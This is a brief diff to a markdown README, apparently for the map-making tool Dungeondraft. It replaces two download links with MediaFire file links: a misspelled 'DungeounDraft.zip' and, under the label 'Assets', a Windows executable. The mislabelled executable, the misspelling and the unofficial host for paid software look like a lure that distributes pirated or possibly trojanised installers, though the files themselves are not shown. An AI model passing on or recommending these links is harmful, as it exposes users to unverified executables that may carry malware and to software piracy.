@@ -68,5 +68,5 @@
 
 ### ✧ Links
 
-- [Dungeondraft](https://hidan.sh/)
-- [Assets](https://hidan.sh/hw35v1nci3o5)
+- [Dungeondraft](https://www.mediafire.com/file/gtdr4ajp70ix81p/DungeounDraft.zip/file)
+- [Assets](https://www.mediafire.com/file/9wajmsz2h69uthg/Dungeondraft-1.1.0.6-Win64.exe/file)
